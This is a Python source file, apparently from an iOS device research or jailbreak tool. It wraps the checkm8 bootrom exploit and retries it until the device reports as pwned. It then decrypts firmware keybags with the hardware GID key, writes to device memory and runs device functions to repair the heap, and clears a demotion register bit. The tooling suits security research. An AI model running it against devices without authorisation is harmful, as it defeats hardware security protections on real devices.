import checkm8.usbexec as usbexec
from checkm8.checkm8 import exploit
from checkm8.device import DFUDevice
import struct

from .offsets import *

class Device:
    def __init__(self):
        self.serial = None
        self.pwned = False
        self.cpid = ""
        self.meta = {}
        self.update_serial()

    def update_serial(self):
        dfu_device = DFUDevice()
        self.serial = dfu_device.device.serial_number
        self.pwned = 'PWND:[checkm8]' in self.serial
        for item in self.serial.split(' '):
            if 'CPID:' in item:
                self.cpid = item.split("CPID:")[1]
                break
        self.meta = meta_for(self.cpid)
        dfu_device.release()

    def decrypt_gid(self, keybag):
        self.do_exploit_if_needed()
        pwned = usbexec.PwnedUSBDevice()
        return pwned.aes(bytes.fromhex(keybag), usbexec.AES_DECRYPT, usbexec.AES_GID_KEY).hex()

    def repair_heap(self):
        HEAP_BASE = int(self.meta['memmap']['heap_base'], base=16)
        HEAP_WRITE_OFFSET = int(self.meta['memmap']['heap_write_offset'], base=16)
        HEAP_WRITE_HASH = int(self.meta['functions']['heap_write_hash'], base=16)
        HEAP_CHECK_ALL = int(self.meta['functions']['heap_verify'], base=16)
        HEAP_STATE = int(self.meta['mem']['heap_state'], base=16)

        block1 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 132, 128, 0)
        block2 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 8, 128, 0)

        device = usbexec.PwnedUSBDevice()

        device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET, block1)
        device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x80, block2)
        device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x100, block2)
        device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x180, block2)

        device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET)
        device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x80)
        device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100)
        device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180)

        device.execute(0, HEAP_CHECK_ALL)

        print('Repaired Heap')

    def demote(self):
        self.do_exploit_if_needed()
        pwned = usbexec.PwnedUSBDevice()
        old_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)
        if old_value & 1:
            pwned.write_memory_uint32(pwned.platform.demotion_reg, old_value & 0xFFFFFFFE)
            new_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)
            if old_value != new_value:
                return True
            else:
                return False
        else:
            return True

    def do_exploit_if_needed(self):
        if self.pwned:
            return
        self.attempt_exploit()

    def attempt_exploit(self, attempts=10):
        for attempt in range(0, attempts+1):
            if not self.pwned:
                exploit()
                self.update_serial()
                if self.pwned:
                    break
            if attempt == 10:
                print("Exploit failed after 10 attempts.")
                raise AssertionError("Exploit Failed after 10 attempts")
